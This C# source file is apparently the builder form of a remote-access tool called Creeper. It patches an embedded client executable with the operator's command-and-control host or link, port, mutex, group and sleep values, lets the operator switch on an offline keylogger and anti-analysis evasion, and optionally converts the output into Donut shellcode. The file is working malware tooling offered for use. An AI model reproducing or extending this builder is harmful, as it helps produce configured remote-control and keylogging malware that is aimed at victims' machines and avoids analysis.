using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Creeper.Properties;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace Creeper.ChildForms
{
    public partial class childFormBuilder : Form
    {
        public childFormBuilder()
        {
            InitializeComponent();
            SetTheme();
        }

        private bool previoustheme;
        private void updateUI_Tick(object sender, EventArgs e)
        {
            if (previoustheme != Settings.Default.darkTheme)
            {
                previoustheme = Settings.Default.darkTheme;
                SetTheme();
            }
        }
        private void SetTheme()
        {
            bool darkTheme = Settings.Default.darkTheme;

            Color colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            Color colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            groupBoxipport.ForeColor = colorText;
            groupBoxothers.ForeColor = colorText;
            textBoxlink.BackColor = colorSide;
            textBoxlink.ForeColor = colorText;
            textBoxip.BackColor = colorSide;
            textBoxip.ForeColor = colorText;
            textBoxport.ForeColor = colorText;
            textBoxport.BackColor = colorSide;
            textBoxgroup.ForeColor = colorText;
            textBoxgroup.BackColor = colorSide;
            numericUpDownsleep.BackColor = colorSide;
            numericUpDownsleep.ForeColor = colorText;

        }

        private void toggleButtonip_MouseClick(object sender, MouseEventArgs e)
        {
            if (toggleButtonip.Checked)
            {
                textBoxlink.Enabled = true;
                textBoxip.Enabled = false;
                textBoxport.Enabled = false;
            }
            else
            {
                textBoxlink.Enabled = false;
                textBoxip.Enabled = true;
                textBoxport.Enabled = true;
            }
        }

        private readonly Random random = new Random();
        const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

        public string getRandomCharacters()
        {
            var sb = new StringBuilder();
            for (int i = 1; i <= new Random().Next(10, 20); i++)
            {
                var randomCharacterPosition = random.Next(0, alphabet.Length);
                sb.Append(alphabet[randomCharacterPosition]);
            }
            return sb.ToString();
        }

        private void buttonbuild_Click(object sender, EventArgs e)
        {
            if (!toggleButtonip.Checked && (string.IsNullOrWhiteSpace(textBoxip.Text) || string.IsNullOrWhiteSpace(textBoxport.Text))) return;
            if (string.IsNullOrWhiteSpace(textBoxmutex.Text)) textBoxmutex.Text = getRandomCharacters();
            if (toggleButtonip.Checked && string.IsNullOrWhiteSpace(textBoxlink.Text)) return;
            if (string.IsNullOrWhiteSpace(textBoxgroup.Text)) textBoxgroup.Text = "Default";

            ModuleDefMD asmDef = null;
            try
            {
#if DEBUG
                MessageBox.Show("Can not built in Debug mode");
                return;
#else
                using (asmDef = ModuleDefMD.Load(radioButtonnet40.Checked ? ReplaceBytes(Resources.Client, Encoding.UTF8.GetBytes("v2.0.50727"), Encoding.UTF8.GetBytes("v4.0.30319")) : Resources.Client))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = false;
                    saveFileDialog1.FileName = "Client";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        buttonbuild.Enabled = false;
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        //asmDef = Obfuscate.obfuscate(asmDef);
                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();
                        if (checkBoxshellcode.Checked)
                        {
                            Donut.Donut.Generate(saveFileDialog1.FileName, saveFileDialog1.FileName + ".bin");
                        }
                        MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
#endif
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();

            }
            buttonbuild.Enabled = true;
        }

        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Program")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Port%")
                                    {
                                        if (toggleButtonip.Checked)
                                        {
                                            method.Body.Instructions[i].Operand = "0";
                                        }
                                        else
                                        {
                                            method.Body.Instructions[i].Operand = textBoxport.Text;
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Host%")
                                    {
                                        if (toggleButtonip.Checked)
                                        {
                                            method.Body.Instructions[i].Operand = "null";
                                        }
                                        else
                                        {
                                            method.Body.Instructions[i].Operand = textBoxip.Text;
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Mutex%")
                                        method.Body.Instructions[i].Operand = textBoxmutex.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%AntiAnalysis%")
                                        method.Body.Instructions[i].Operand = toggleButtonantivm.Checked.ToString();

                                    if (method.Body.Instructions[i].Operand.ToString() == "%OffLineKeyLogger%")
                                        method.Body.Instructions[i].Operand = toggleButtonofflinekeylogger.Checked.ToString();

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Sleep%")
                                        method.Body.Instructions[i].Operand = numericUpDownsleep.Value.ToString();

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Link%")
                                        if (toggleButtonip.Checked)
                                            method.Body.Instructions[i].Operand = textBoxlink.Text;
                                        else
                                            method.Body.Instructions[i].Operand = "";

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
                                        method.Body.Instructions[i].Operand = textBoxgroup.Text;
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }

        public static byte[] ReplaceBytes(byte[] src, byte[] search, byte[] repl)
        {
            if (repl == null) return src;
            int index = FindBytes(src, search);
            if (index < 0) return src;
            byte[] dst = new byte[src.Length - search.Length + repl.Length];
            Buffer.BlockCopy(src, 0, dst, 0, index);
            Buffer.BlockCopy(repl, 0, dst, index, repl.Length);
            Buffer.BlockCopy(src, index + search.Length, dst, index + repl.Length, src.Length - (index + search.Length));
            return dst;
        }

        public static int FindBytes(byte[] src, byte[] find)
        {
            if (src == null || find == null || src.Length == 0 || find.Length == 0 || find.Length > src.Length) return -1;
            for (int i = 0; i < src.Length - find.Length + 1; i++)
            {
                if (src[i] == find[0])
                {
                    for (int m = 1; m < find.Length; m++)
                    {
                        if (src[i + m] != find[m]) break;
                        if (m == find.Length - 1) return i;
                    }
                }
            }
            return -1;
        }
    }
}
